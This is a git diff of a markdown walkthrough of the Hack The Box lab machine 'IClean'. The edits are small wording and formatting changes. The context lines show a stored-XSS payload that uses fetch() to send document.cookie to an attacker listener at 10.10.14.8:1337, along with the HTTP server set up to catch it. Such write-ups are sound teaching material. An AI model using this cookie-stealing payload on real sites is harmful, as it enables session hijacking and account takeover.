@@ -77,13 +77,13 @@ Progress: 23895 / 30001 (79.65%)[ERROR] parse "http://capiclean.htb/error\x1f_lo
 Progress: 30000 / 30001 (100.00%)
 ```
 
-The `/quote` endpoint looked promising. I noticed a "Service" parameter and decided to play around with it
+The `/quote` endpoint looked promising
 
 ![img](/assets/img/IClean/2.webp)
 
 ### XSS via Service parameter
 
-I created a classic XSS payload using an `<img>` tag with an `onerror` handler
+I created a XSS payload using an `<img>` tag with an `onerror` handler
 
 ```js
 <img src=x onerror=fetch("http://10.10.14.8:1337/"+document.cookie);>
@@ -91,7 +91,7 @@ I created a classic XSS payload using an `<img>` tag with an `onerror` handl
 
 Started a simple HTTP server on port 1337 to catch the cookie
 
-```python
+```bash
 $ python -m http.server 1337
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 10.10.11.12 - - [01/May/2024 21:04:32] code 404, message File not found
